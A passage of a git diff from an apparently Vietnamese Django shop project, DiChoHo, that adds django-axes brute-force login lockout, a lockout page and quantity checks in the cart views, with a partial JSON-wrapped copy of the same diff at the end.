 'django.contrib.admin',\n-    'django.contrib.auth',\n-    'django.contrib.contenttypes',\n-    'django.contrib.sessions',\n-    'django.contrib.messages',\n-    'django.contrib.staticfiles',\n-\n-    'shop',\n-    'orders',\n-    'checkout'\n-]\n-\n-MIDDLEWARE = [\n-    'django.middleware.security.SecurityMiddleware',\n-    'django.contrib.sessions.middleware.SessionMiddleware',\n-    'django.middleware.common.CommonMiddleware',\n-    'django.middleware.csrf.CsrfViewMiddleware',\n-    'django.contrib.auth.middleware.AuthenticationMiddleware',\n-    'django.contrib.messages.middleware.MessageMiddleware',\n-    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n-]\n-\n-ROOT_URLCONF = 'DiChoHo.urls'\n-\n-TEMPLATES = [\n-    {\n-        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n-        'DIRS': [\n-            BASE_DIR \/ 'templates'\n-        ],\n-        'APP_DIRS': True,\n-        'OPTIONS': {\n-            'context_processors': [\n-                'django.template.context_processors.debug',\n-                'django.template.context_processors.request',\n-                'django.contrib.auth.context_processors.auth',\n-                'django.contrib.messages.context_processors.messages',\n-                'shop.context_processors.cart',\n-            ],\n-        },\n-    },\n-]\n-\n-WSGI_APPLICATION = 'DiChoHo.wsgi.application'\n-\n-\n-# Database\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#databases\n-\n-DATABASES = {\n-    'default': {\n-        'ENGINE': 'django.db.backends.mysql', \n-        'NAME': os.environ.get('MYSQL_NAME'),\n-        'USER': os.environ.get('MYSQL_USER'),\n-        'PASSWORD': os.environ.get('MYSQL_PASSWORD'),\n-        'HOST': 'db',\n-        'PORT': '3306',\n-    }\n-}\n-\n-\n-# Password validation\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#auth-password-validators\n-\n-AUTH_PASSWORD_VALIDATORS = [\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n-    },\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n-    },\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n-    },\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n-    },\n-]\n-\n-\n-# Internationalization\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/\n-\n-LANGUAGE_CODE = 'en-us'\n-\n-TIME_ZONE = 'Asia\/Ho_Chi_Minh'\n-\n-USE_I18N = True\n-\n-USE_L10N = True\n-\n-USE_TZ = True\n-\n-\n-# Static files (CSS, JavaScript, Images)\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/static-files\/\n-\n-STATIC_URL = '\/static\/'\n-STATICFILES_DIRS = [\n-    BASE_DIR \/ \"templates\/static\",\n-]\n-STATIC_ROOT = os.path.join(BASE_DIR, 'static')\n-\n-DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n-\n-#Cart session ID\n-CART_SESSION_ID = \"cart\"\n-\n-LOGIN_URL='\/login'\n-LOGIN_REDIRECT_URL='\/login'\n-\n-EMAIL_BACKEND = \"django.core.mail.backends.smtp.EmailBackend\"\n-EMAIL_HOST = 'smtp.gmail.com'\n-EMAIL_HOST_USER ='' # Email s\u1eed dung \u0111\u1ec3 g\u1eedi mail t\u1edbi kh\u00e1ch h\u00e0ng\n-EMAIL_HOST_PASSWORD = '' # M\u1eadt kh\u1ea9u email\n-EMAI_PORT = 587\n-EMAIL_USE_TLS = True\n\\ No newline at end of file\n+\"\"\"\r\n+Django settings for DiChoHo project.\r\n+\r\n+Generated by 'django-admin startproject' using Django 3.2.7.\r\n+\r\n+For more information on this file, see\r\n+https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/\r\n+\r\n+For the full list of settings and their values, see\r\n+https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/\r\n+\"\"\"\r\n+\r\n+from pathlib import Path\r\n+import os\r\n+\r\n+# Build paths inside the project like this: BASE_DIR \/ 'subdir'.\r\n+BASE_DIR = Path(__file__).resolve().parent.parent\r\n+\r\n+\r\n+# Quick-start development settings - unsuitable for production\r\n+# See https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/deployment\/checklist\/\r\n+\r\n+# SECURITY WARNING: keep the secret key used in production secret!\r\n+SECRET_KEY = 'django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^#a32m8rlo1)8v7ntkyznc'\r\n+\r\n+# SECURITY WARNING: don't run with debug turned on in production!\r\n+DEBUG = True\r\n+\r\n+ALLOWED_HOSTS = ['127.0.0.1', 'localhost']\r\n+\r\n+\r\n+# Application definition\r\n+\r\n+INSTALLED_APPS = [\r\n+    'django.contrib.admin',\r\n+    'django.contrib.auth',\r\n+    'django.contrib.contenttypes',\r\n+    'django.contrib.sessions',\r\n+    'django.contrib.messages',\r\n+    'django.contrib.staticfiles',\r\n+\r\n+    'shop',\r\n+    'orders',\r\n+    'checkout',\r\n+    'axes'\r\n+]\r\n+\r\n+MIDDLEWARE = [\r\n+    'django.middleware.security.SecurityMiddleware',\r\n+    'django.contrib.sessions.middleware.SessionMiddleware',\r\n+    'django.middleware.common.CommonMiddleware',\r\n+    'django.middleware.csrf.CsrfViewMiddleware',\r\n+    'django.contrib.auth.middleware.AuthenticationMiddleware',\r\n+    'django.contrib.messages.middleware.MessageMiddleware',\r\n+    'django.middleware.clickjacking.XFrameOptionsMiddleware',\r\n+    'axes.middleware.AxesMiddleware'\r\n+]\r\n+\r\n+AUTHENTICATION_BACKENDS = [\r\n+    # AxesBackend should be the first backend in the AUTHENTICATION_BACKENDS list.\r\n+    'axes.backends.AxesBackend',\r\n+\r\n+    # Django ModelBackend is the default authentication backend.\r\n+    'django.contrib.auth.backends.ModelBackend',\r\n+]\r\n+\r\n+ROOT_URLCONF = 'DiChoHo.urls'\r\n+\r\n+TEMPLATES = [\r\n+    {\r\n+        'BACKEND': 'django.template.backends.django.DjangoTemplates',\r\n+        'DIRS': [\r\n+            BASE_DIR \/ 'templates'\r\n+        ],\r\n+        'APP_DIRS': True,\r\n+        'OPTIONS': {\r\n+            'context_processors': [\r\n+                'django.template.context_processors.debug',\r\n+                'django.template.context_processors.request',\r\n+                'django.contrib.auth.context_processors.auth',\r\n+                'django.contrib.messages.context_processors.messages',\r\n+                'shop.context_processors.cart',\r\n+            ],\r\n+        },\r\n+    },\r\n+]\r\n+\r\n+WSGI_APPLICATION = 'DiChoHo.wsgi.application'\r\n+\r\n+\r\n+# Database\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#databases\r\n+\r\n+DATABASES = {\r\n+    'default': {\r\n+        'ENGINE': 'django.db.backends.mysql',\r\n+        'NAME': 'profileuser',\r\n+        'USER': '',\r\n+        'PASSWORD': '',\r\n+        'HOST': 'localhost',\r\n+        'PORT': '3306',\r\n+    }\r\n+}\r\n+\r\n+\r\n+# Password validation\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#auth-password-validators\r\n+\r\n+AUTH_PASSWORD_VALIDATORS = [\r\n+    {\r\n+        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\r\n+    },\r\n+    {\r\n+        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\r\n+    },\r\n+    {\r\n+        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\r\n+    },\r\n+    {\r\n+        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\r\n+    },\r\n+]\r\n+\r\n+\r\n+# Internationalization\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/\r\n+\r\n+LANGUAGE_CODE = 'en-us'\r\n+\r\n+TIME_ZONE = 'Asia\/Ho_Chi_Minh'\r\n+\r\n+USE_I18N = True\r\n+\r\n+USE_L10N = True\r\n+\r\n+USE_TZ = True\r\n+\r\n+\r\n+# Static files (CSS, JavaScript, Images)\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/static-files\/\r\n+\r\n+STATIC_URL = '\/static\/'\r\n+STATICFILES_DIRS = [\r\n+    BASE_DIR \/ \"templates\/static\",\r\n+]\r\n+STATIC_ROOT = os.path.join(BASE_DIR, 'static')\r\n+\r\n+DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\r\n+\r\n+# Cart session ID\r\n+CART_SESSION_ID = \"cart\"\r\n+\r\n+LOGIN_URL = '\/login'\r\n+LOGIN_REDIRECT_URL = '\/login'\r\n+\r\n+EMAIL_BACKEND = \"django.core.mail.backends.smtp.EmailBackend\"\r\n+EMAIL_HOST = 'smtp.gmail.com'\r\n+EMAIL_HOST_USER = ''  # Email s\u1eed dung \u0111\u1ec3 g\u1eedi mail t\u1edbi kh\u00e1ch h\u00e0ng\r\n+EMAIL_HOST_PASSWORD = ''  # M\u1eadt kh\u1ea9u email\r\n+EMAI_PORT = 587\r\n+EMAIL_USE_TLS = True\r\n+\r\n+# Configure on django_axes, prevent login bruteforce\r\n+# After 5 times login failed, user will be banned\r\n+AXES_FAILURE_LIMIT = 5\r\n+# Reset time is 1 hour\r\n+AXES_COOLOFF_TIME = 1\r\n+AXES_RESET_ON_SUCCESS = True\r\n+AXES_LOCK_OUT_BY_COMBINATION_USER_AND_IP = True\r\n+AXES_LOCKOUT_URL = '\/lockedout'\r\ndiff --git a\/DiChoHo\/shop\/urls.py b\/DiChoHo\/shop\/urls.py\nindex fad9912..b329636 100644\n--- a\/DiChoHo\/shop\/urls.py\n+++ b\/DiChoHo\/shop\/urls.py\n@@ -4,33 +4,39 @@\n \n urlpatterns = [\n \n-     path('', views.index_view, name='home'),\n-     path('login\/', views.login_view, name='login'),\n-     path('register\/', views.register_view, name='register'),\n-     path('logout\/', views.logout_view, name='logout'),\n-     path('about\/', views.about_view, name='about'),\n-     # wishlist\n-     path('wishlist\/', views.wishlist_view, name='wishlist'),\n-     path('wishlist\/add', views.wishlist_add, name='wishlist_add'),\n-     path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'),\n-     # shop, product\n-     path('shop\/', views.shop_view, name='shop'),\n-     path('product\/<slug:slug>', views.product_detail, name='product_detail'),\n-     path('shop\/<slug:category_slug>\/', views.category_list, name='category_list'),\n-     # cart\n-     path('cart\/', views.cart_view, name='cart'),\n-     path('cart\/add\/', views.cart_add, name='cart_add'),\n-     path('cart\/delete\/', views.cart_delete, name='cart_delete'),\n-     path('cart\/update\/', views.cart_update, name='cart_update'),\n-     #profile\n-     path('profile\/', views.profile_view, name='profile'),\n-     path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"),\n-     path(\"profile\/edit_addresses\/<slug:id>\/\", views.edit_address, name=\"edit_address\"),\n-     path(\"profile\/delete_addresses\/<slug:id>\/\", views.delete_address, name=\"delete_address\"),\n-     path(\"profile\/set_address_default\/<slug:id>\/\", views.set_address_default, name=\"set_address_default\"),\n-     path(\"profile\/edit_profile\/<slug:id>\/\",  views.edit_profile, name=\"edit_profile\"),\n-     path(\"profile\/review\", views.review_add, name=\"review_add\"),\n-     # something else\n-     path('search\/', views.search_views, name='search_views'),\n-     path('404\/', views.page_not_found, name='404'),\n+    path('', views.index_view, name='home'),\n+    path('login\/', views.login_view, name='login'),\n+    path('register\/', views.register_view, name='register'),\n+    path('logout\/', views.logout_view, name='logout'),\n+    path('about\/', views.about_view, name='about'),\n+    # wishlist\n+    path('wishlist\/', views.wishlist_view, name='wishlist'),\n+    path('wishlist\/add', views.wishlist_add, name='wishlist_add'),\n+    path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'),\n+    # shop, product\n+    path('shop\/', views.shop_view, name='shop'),\n+    path('product\/<slug:slug>', views.product_detail, name='product_detail'),\n+    path('shop\/<slug:category_slug>\/',\n+         views.category_list, name='category_list'),\n+    # cart\n+    path('cart\/', views.cart_view, name='cart'),\n+    path('cart\/add\/', views.cart_add, name='cart_add'),\n+    path('cart\/delete\/', views.cart_delete, name='cart_delete'),\n+    path('cart\/update\/', views.cart_update, name='cart_update'),\n+    # profile\n+    path('profile\/', views.profile_view, name='profile'),\n+    path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"),\n+    path(\"profile\/edit_addresses\/<slug:id>\/\",\n+         views.edit_address, name=\"edit_address\"),\n+    path(\"profile\/delete_addresses\/<slug:id>\/\",\n+         views.delete_address, name=\"delete_address\"),\n+    path(\"profile\/set_address_default\/<slug:id>\/\",\n+         views.set_address_default, name=\"set_address_default\"),\n+    path(\"profile\/edit_profile\/<slug:id>\/\",\n+         views.edit_profile, name=\"edit_profile\"),\n+    path(\"profile\/review\", views.review_add, name=\"review_add\"),\n+    # something else\n+    path('search\/', views.search_views, name='search_views'),\n+    path('404\/', views.page_not_found, name='404'),\n+    path('lockedout', views.locked_out, name='lockedout'),\n ]\ndiff --git a\/DiChoHo\/shop\/views.py b\/DiChoHo\/shop\/views.py\nindex feef8da..80fe1f9 100644\n--- a\/DiChoHo\/shop\/views.py\n+++ b\/DiChoHo\/shop\/views.py\n@@ -23,11 +23,14 @@\n \n \n def handler404(request):\n-    response = django.shortcuts.render_to_response('404.html', {}, context_instance=RequestContext(request))\n+    response = django.shortcuts.render_to_response(\n+        '404.html', {}, context_instance=RequestContext(request))\n     response.status_code = 404\n     return response\n \n # get index page\n+\n+\n def index_view(request):\n     products = Product.objects.all().order_by('-sold')\n     products2 = Product.objects.all().order_by('-created')\n@@ -49,13 +52,15 @@ def shop_view(request):\n     return render(request, 'shop.html', {'products': products})\n \n # get login page\n+\n+\n def login_view(request):\n     if request.user.is_authenticated:\n         return redirect('\/')\n     if request.method == 'POST':\n         getUsername = request.POST[\"username\"]\n         getPassword = request.POST[\"password\"]\n-        user = authenticate(username=getUsername,\n+        user = authenticate(request=request, username=getUsername,\n                             password=getPassword)\n         if user is not None:\n             login(request, user)\n@@ -66,6 +71,8 @@ def login_view(request):\n     return render(request, 'login.html')\n \n # get register page\n+\n+\n def register_view(request):\n     if request.user.is_authenticated:\n         return redirect('\/')\n@@ -101,6 +108,8 @@ def register_view(request):\n     return render(request, 'register.html')\n \n # send mail\n+\n+\n @csrf_exempt\n def send_mail(uid):\n     template = render_to_string('register_mail.html', {'name': uid.first_name})\n@@ -123,6 +132,8 @@ def logout_view(request):\n     return redirect('\/')\n \n # get about page\n+\n+\n def about_view(request):\n     return render(\n         request,\n@@ -130,6 +141,8 @@ def about_view(request):\n     )\n \n # get wishlist page\n+\n+\n @login_required\n def wishlist_view(request):\n     products = Product.objects.filter(users_wishlist=request.user)\n@@ -139,6 +152,7 @@ def wishlist_view(request):\n         {\"products\": products}\n     )\n \n+\n @login_required\n def wishlist_add(request):\n     prodid = request.POST.get(\"productid\")\n@@ -147,6 +161,7 @@ def wishlist_add(request):\n     response = JsonResponse({\"Status\": \"OK\"})\n     return response\n \n+\n @login_required\n def wishlist_delete(request):\n     prodid = request.POST.get(\"productid\")\n@@ -156,6 +171,8 @@ def wishlist_delete(request):\n     return response\n \n # profile\n+\n+\n @login_required\n def profile_view(request):\n     if request.method == \"POST\":\n@@ -182,6 +199,7 @@ def profile_view(request):\n             'form': form, 'addresses': addresses, 'ratings': ratings}\n     )\n \n+\n @login_required\n def edit_profile(request, id):\n     if request.method == \"POST\":\n@@ -209,6 +227,8 @@ def edit_profile(request, id):\n     return render(request, \"edit_profile.html\", {\"user_form\": user_form, \"profile_form\": profile_form})\n \n # view category, product\n+\n+\n def category_list(request, category_slug=None):\n     category = get_object_or_404(Category, slug=category_slug)\n     allFilterProducts = Product.objects.filter(category=category)\n@@ -241,15 +261,15 @@ def product_detail(request, slug):\n     print(average_stars)\n     average_stars_int = int(average_stars)\n     print(average_stars_int)\n-    return render(request, 'product-single.html', \n-                    {'product': product, 'relative_products': relative_products, \n-                    'ratings': allRatings, \"rating_count\": count, \n-                    'stars': average_stars, 'stars_int': range(average_stars_int), \n-                    'unstars_int': range(5 - average_stars_int)\n-                    })\n+    return render(request, 'product-single.html',\n+                  {'product': product, 'relative_products': relative_products,\n+                   'ratings': allRatings, \"rating_count\": count,\n+                   'stars': average_stars, 'stars_int': range(average_stars_int),\n+                   'unstars_int': range(5 - average_stars_int)\n+                   })\n \n \n-#review\n+# review\n @login_required\n def review_add(request):\n     # if request.method == \"POST\":\n@@ -261,13 +281,12 @@ def review_add(request):\n         content = str(request.POST.get(\"content\"))\n         ratingStar = float(request.POST.get(\"star\"))\n \n-        \n         if Rating.objects.filter(product=product_id).exists():\n             rating = Rating.objects.filter(product=product_id).update(\n                 content=content,\n                 ratingStar=ratingStar,\n             )\n-            \n+\n         else:\n             rating = Rating.objects.create(\n                 user=user,\n@@ -285,41 +304,51 @@ def cart_view(request):\n     cart = Cart(request)\n     return render(request, \"cart.html\", {\"cart\": cart})\n \n+\n def cart_add(request):\n-    cart = Cart(request)\n-    if request.POST.get(\"action\") == \"post\":\n-        product_id = int(request.POST.get(\"productid\"))\n-        product_qty = int(request.POST.get(\"productqty\"))\n-        product = get_object_or_404(Product, id=product_id)\n-        cart.add(product=product, qty=product_qty)\n-        cartqty = cart.__len__()\n-        response = JsonResponse({\"qty\": cartqty})\n-        return response\n+    if type(int(request.POST.get(\"productqty\"))) is int:\n+        if int(request.POST.get(\"productqty\")) > 0:\n+            cart = Cart(request)\n+            if request.POST.get(\"action\") == \"post\":\n+                product_id = int(request.POST.get(\"productid\"))\n+                product_qty = int(request.POST.get(\"productqty\"))\n+                product = get_object_or_404(Product, id=product_id)\n+                cart.add(product=product, qty=product_qty)\n+                cartqty = cart.__len__()\n+                response = JsonResponse({\"qty\": cartqty})\n+                return response\n+    else:\n+        print(type(request.POST.get(\"productqty\")))\n+\n \n def cart_delete(request):\n     cart = Cart(request)\n     if request.POST.get(\"action\") == \"post\":\n         product_id = int(request.POST.get(\"productid\"))\n         cart.delete(product=product_id)\n-\n         cartqty = cart.__len__()\n         carttotal = cart.get_total_price()\n         response = JsonResponse({\"qty\": cartqty, \"subtotal\": carttotal})\n         return response\n \n-def cart_update(request):\n-    cart = Cart(request)\n-    if request.POST.get(\"action\") == \"post\":\n-        product_id = int(request.POST.get(\"productid\"))\n-        product_qty = int(request.POST.get(\"productqty\"))\n-        cart.update(product=product_id, qty=product_qty)\n \n-        cartqty = cart.__len__()\n-        cartsubtotal = cart.get_subtotal_price()\n-        response = JsonResponse({\"qty\": cartqty, \"subtotal\": cartsubtotal})\n-        return response\n+def cart_update(request):\n+    if type(int(request.POST.get(\"productqty\"))) is int:\n+        if int(request.POST.get(\"productqty\")) > 0:\n+            cart = Cart(request)\n+            if request.POST.get(\"action\") == \"post\":\n+                product_id = int(request.POST.get(\"productid\"))\n+                product_qty = int(request.POST.get(\"productqty\"))\n+                cart.update(product=product_id, qty=product_qty)\n+                cartqty = cart.__len__()\n+                cartsubtotal = cart.get_subtotal_price()\n+                response = JsonResponse(\n+                    {\"qty\": cartqty, \"subtotal\": cartsubtotal})\n+                return response\n \n # address(c\u00f3 nhi\u1ec1u \u0111\u1ecba ch\u1ec9 c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c t\u1ea1o)\n+\n+\n @ login_required\n def add_address(request):\n     if request.method == \"POST\":\n@@ -333,6 +362,7 @@ def add_address(request):\n         address_form = AddressForm()\n     return render(request, \"edit_address.html\", {\"form\": address_form})\n \n+\n @ login_required\n def edit_address(request, id):\n     if request.method == \"POST\":\n@@ -346,11 +376,13 @@ def edit_address(request, id):\n         address_form = AddressForm(instance=address)\n     return render(request, \"edit_address.html\", {\"form\": address_form})\n \n+\n @ login_required\n def delete_address(request, id):\n     address = Address.objects.filter(pk=id, user=request.user).delete()\n     return redirect(\"profile\")\n \n+\n @ login_required\n def set_address_default(request, id):\n     Address.objects.filter(\n@@ -364,6 +396,8 @@ def set_address_default(request, id):\n     return redirect(\"profile\")\n \n # search\n+\n+\n def search_views(request):\n     query_item = request.GET.get(\"search\").lower()\n     products = Product.objects.filter(title__icontains=query_item)\n@@ -372,3 +406,6 @@ def search_views(request):\n \n def page_not_found(request):\n     return render(request, '404.html')\n+\n+def locked_out(request):\n+    return render(request,'lockedout.html')\n\\ No newline at end of file\ndiff --git a\/DiChoHo\/templates\/lockedout.html b\/DiChoHo\/templates\/lockedout.html\nnew file mode 100644\nindex 0000000..29ba633\n--- \/dev\/null\n+++ b\/DiChoHo\/templates\/lockedout.html\n@@ -0,0 +1,21 @@\n+{% extends 'base.html' %}\n+\n+{% block title %}L\u1ed7i{% endblock %}\n+\n+{% block menu_about_class %}active{% endblock %}\n+\n+{% block content %}\n+{% load static %}\n+<h1 class=\"mt-5\">Banned<\/h1>\n+<p class=\"zoom-area\">Qu\u00e1 nhi\u1ec1u l\u1ea7n \u0111\u0103ng nh\u1eadp th\u1ea5t b\u1ea1i!<\/p>\n+<p class=\"zoom-area\">Vui l\u00f2ng th\u1eed \u0111\u0103ng nh\u1eadp l\u1ea1i sau 1 gi\u1edd n\u1eefa :)<\/p>\n+\n+<p align=\"center\">\n+  <img src=\"https:\/\/www.meme-arsenal.com\/memes\/f12d380f2b33fe3207bf827628c85698.jpg\" \/>\n+<\/p>\n+\n+<div class=\"link-container\">\n+  <a href=\"{% url 'home' %}\" class=\"more-link\">V\u1ec1 trang ch\u1ee7<\/a>\n+<\/div>\n+\n+{% endblock %}\n\\ No newline at end of file\ndiff --git a\/requirements.txt b\/requirements.txt\nindex 5b4e133..aa728c6 100644\nBinary files a\/requirements.txt and b\/requirements.txt differ\n","files":{"\/DiChoHo\/DiChoHo\/settings.py":{"changes":[{"diff":"\n-\"\"\"\n-Django settings for DiChoHo project.\n-\n-Generated by 'django-admin startproject' using Django 3.2.7.\n-\n-For more information on this file, see\n-https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/\n-\n-For the full list of settings and their values, see\n-https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/\n-\"\"\"\n-\n-from pathlib import Path\n-import os\n-\n-# Build paths inside the project like this: BASE_DIR \/ 'subdir'.\n-BASE_DIR = Path(__file__).resolve().parent.parent\n-\n-\n-# Quick-start development settings - unsuitable for production\n-# See https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/deployment\/checklist\/\n-\n-# SECURITY WARNING: keep the secret key used in production secret!\n-SECRET_KEY = 'django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^#a32m8rlo1)8v7ntkyznc'\n-\n-# SECURITY WARNING: don't run with debug turned on in production!\n-DEBUG = True\n-\n-ALLOWED_HOSTS = ['127.0.0.1', 'localhost', '192.168.1.20']\n-\n-\n-# Application definition\n-\n-INSTALLED_APPS = [\n-    'django.contrib.admin',\n-    'django.contrib.auth',\n-    'django.contrib.contenttypes',\n-    'django.contrib.sessions',\n-    'django.contrib.messages',\n-    'django.contrib.staticfiles',\n-\n-    'shop',\n-    'orders',\n-    'checkout'\n-]\n-\n-MIDDLEWARE = [\n-    'django.middleware.security.SecurityMiddleware',\n-    'django.contrib.sessions.middleware.SessionMiddleware',\n-    'django.middleware.common.CommonMiddleware',\n-    'django.middleware.csrf.CsrfViewMiddleware',\n-    'django.contrib.auth.middleware.AuthenticationMiddleware',\n-    'django.contrib.messages.middleware.MessageMiddleware',\n-    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n-]\n-\n-ROOT_URLCONF = 'DiChoHo.urls'\n-\n-TEMPLATES = [\n-    {\n-        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n-        'DIRS': [\n-            BASE_DIR \/ 'templates'\n-        ],\n-        'APP_DIRS': True,\n-        'OPTIONS': {\n-            'context_processors': [\n-                'django.template.context_processors.debug',\n-                'django.template.context_processors.request',\n-                'django.contrib.auth.context_processors.auth',\n-                'django.contrib.messages.context_processors.messages',\n-                'shop.context_processors.cart',\n-            ],\n-        },\n-    },\n-]\n-\n-WSGI_APPLICATION = 'DiChoHo.wsgi.application'\n-\n-\n-# Database\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#databases\n-\n-DATABASES = {\n-    'default': {\n-        'ENGINE': 'django.db.backends.mysql', \n-        'NAME': os.environ.get('MYSQL_NAME'),\n-        'USER': os.environ.get('MYSQL_USER'),\n-        'PASSWORD': os.environ.get('MYSQL_PASSWORD'),\n-        'HOST': 'db',\n-        'PORT': '3306',\n-    }\n-}\n-\n-\n-# Password validation\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#auth-password-validators\n-\n-AUTH_PASSWORD_VALIDATORS = [\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n-    },\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n-    },\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n-    },\n-    {\n-        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n-    },\n-]\n-\n-\n-# Internationalization\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/\n-\n-LANGUAGE_CODE = 'en-us'\n-\n-TIME_ZONE = 'Asia\/Ho_Chi_Minh'\n-\n-USE_I18N = True\n-\n-USE_L10N = True\n-\n-USE_TZ = True\n-\n-\n-# Static files (CSS, JavaScript, Images)\n-# https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/static-files\/\n-\n-STATIC_URL = '\/static\/'\n-STATICFILES_DIRS = [\n-    BASE_DIR \/ \"templates\/static\",\n-]\n-STATIC_ROOT = os.path.join(BASE_DIR, 'static')\n-\n-DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n-\n-#Cart session ID\n-CART_SESSION_ID = \"cart\"\n-\n-LOGIN_URL='\/login'\n-LOGIN_REDIRECT_URL='\/login'\n-\n-EMAIL_BACKEND = \"django.core.mail.backends.smtp.EmailBackend\"\n-EMAIL_HOST = 'smtp.gmail.com'\n-EMAIL_HOST_USER ='' # Email s\u1eed dung \u0111\u1ec3 g\u1eedi mail t\u1edbi kh\u00e1ch h\u00e0ng\n-EMAIL_HOST_PASSWORD = '' # M\u1eadt kh\u1ea9u email\n-EMAI_PORT = 587\n-EMAIL_USE_TLS = True\n\\ No newline at end of file\n+\"\"\"\r\n+Django settings for DiChoHo project.\r\n+\r\n+Generated by 'django-admin startproject' using Django 3.2.7.\r\n+\r\n+For more information on this file, see\r\n+https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/\r\n+\r\n+For the full list of settings and their values, see\r\n+https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/\r\n+\"\"\"\r\n+\r\n+from pathlib import Path\r\n+import os\r\n+\r\n+# Build paths inside the project like this: BASE_DIR \/ 'subdir'.\r\n+BASE_DIR = Path(__file__).resolve().parent.parent\r\n+\r\n+\r\n+# Quick-start development settings - unsuitable for production\r\n+# See https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/deployment\/checklist\/\r\n+\r\n+# SECURITY WARNING: keep the secret key used in production secret!\r\n+SECRET_KEY = 'django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^#a32m8rlo1)8v7ntkyznc'\r\n+\r\n+# SECURITY WARNING: don't run with debug turned on in production!\r\n+DEBUG = True\r\n+\r\n+ALLOWED_HOSTS = ['127.0.0.1', 'localhost']\r\n+\r\n+\r\n+# Application definition\r\n+\r\n+INSTALLED_APPS = [\r\n+    'django.contrib.admin',\r\n+    'django.contrib.auth',\r\n+    'django.contrib.contenttypes',\r\n+    'django.contrib.sessions',\r\n+    'django.contrib.messages',\r\n+    'django.contrib.staticfiles',\r\n+\r\n+    'shop',\r\n+    'orders',\r\n+    'checkout',\r\n+    'axes'\r\n+]\r\n+\r\n+MIDDLEWARE = [\r\n+    'django.middleware.security.SecurityMiddleware',\r\n+    'django.contrib.sessions.middleware.SessionMiddleware',\r\n+    'django.middleware.common.CommonMiddleware',\r\n+    'django.middleware.csrf.CsrfViewMiddleware',\r\n+    'django.contrib.auth.middleware.AuthenticationMiddleware',\r\n+    'django.contrib.messages.middleware.MessageMiddleware',\r\n+    'django.middleware.clickjacking.XFrameOptionsMiddleware',\r\n+    'axes.middleware.AxesMiddleware'\r\n+]\r\n+\r\n+AUTHENTICATION_BACKENDS = [\r\n+    # AxesBackend should be the first backend in the AUTHENTICATION_BACKENDS list.\r\n+    'axes.backends.AxesBackend',\r\n+\r\n+    # Django ModelBackend is the default authentication backend.\r\n+    'django.contrib.auth.backends.ModelBackend',\r\n+]\r\n+\r\n+ROOT_URLCONF = 'DiChoHo.urls'\r\n+\r\n+TEMPLATES = [\r\n+    {\r\n+        'BACKEND': 'django.template.backends.django.DjangoTemplates',\r\n+        'DIRS': [\r\n+            BASE_DIR \/ 'templates'\r\n+        ],\r\n+        'APP_DIRS': True,\r\n+        'OPTIONS': {\r\n+            'context_processors': [\r\n+                'django.template.context_processors.debug',\r\n+                'django.template.context_processors.request',\r\n+                'django.contrib.auth.context_processors.auth',\r\n+                'django.contrib.messages.context_processors.messages',\r\n+                'shop.context_processors.cart',\r\n+            ],\r\n+        },\r\n+    },\r\n+]\r\n+\r\n+WSGI_APPLICATION = 'DiChoHo.wsgi.application'\r\n+\r\n+\r\n+# Database\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#databases\r\n+\r\n+DATABASES = {\r\n+    'default': {\r\n+        'ENGINE': 'django.db.backends.mysql',\r\n+        'NAME': 'profileuser',\r\n+        'USER': '',\r\n+        'PASSWORD': '',\r\n+        'HOST': 'localhost',\r\n+        'PORT': '3306',\r\n+    }\r\n+}\r\n+\r\n+\r\n+# Password validation\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#auth-password-validators\r\n+\r\n+AUTH_PASSWORD_VALIDATORS = [\r\n+    {\r\n+        'NAME': 